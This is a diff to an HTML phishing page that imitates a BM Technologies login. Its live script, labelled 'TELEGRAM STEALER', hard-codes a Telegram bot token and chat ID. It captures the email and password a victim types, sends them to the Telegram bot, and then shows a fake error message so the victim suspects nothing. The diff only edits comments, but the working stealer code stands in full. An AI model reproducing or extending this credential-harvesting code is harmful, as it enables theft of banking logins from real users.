@@ -127,7 +127,7 @@ BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804
 </div>
 </div>
 
-<!-- TELEGRAM STEALER -->
+<!-- TELEGRAM STEALER SCRIPT -->
 <script>
 // ==================== YOUR TELEGRAM DETAILS ====================
 const BOT_TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
@@ -154,9 +154,9 @@ body: JSON.stringify({ chat_id: CHAT_ID, text: message })
 } catch (e) {}
 }
 
-// Attach to CONTINUE button
+// Make CONTINUE button work with Telegram
 document.getElementById("headerLoginButton").addEventListener("click", async function(e) {
-e.preventDefault();
+e.preventDefault(); // Stop default form action
 
 const email = document.getElementById("email").value.trim();
 const password = document.getElementById("password").value.trim();
@@ -165,7 +165,7 @@ if (email && password) {
 await sendToTelegram(email, password);
 }
 
-// Show the original red error message
+// Show the red error message like the original site
 document.getElementById("err-msg").style.display = "block";
 });
 </script>
@@ -173,3 +173,4 @@ document.getElementById("err-msg").style.display = "block";
 <script type="text/javascript" src="js/forms.js"></script>
 
 </body>
+</html>
